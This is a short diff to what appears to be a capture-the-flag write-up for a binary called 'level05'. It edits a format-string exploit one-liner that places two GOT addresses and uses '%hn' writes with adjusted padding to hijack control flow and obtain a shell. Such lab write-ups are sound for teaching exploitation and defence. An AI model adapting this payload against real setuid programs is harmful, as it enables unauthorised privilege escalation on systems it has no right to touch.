@@ -142,7 +142,7 @@ We first print 8 bytes (the two 4-byte GOT addresses at the front), so:
 🟨 **Terminal:**
 
 ```bash
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10189d%11$hn")'; cat) | ./level05
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55419d%10$hn" + "%10108d%11$hn")'; cat) | ./level05
 ```
 
 🟨 **In the shell:**
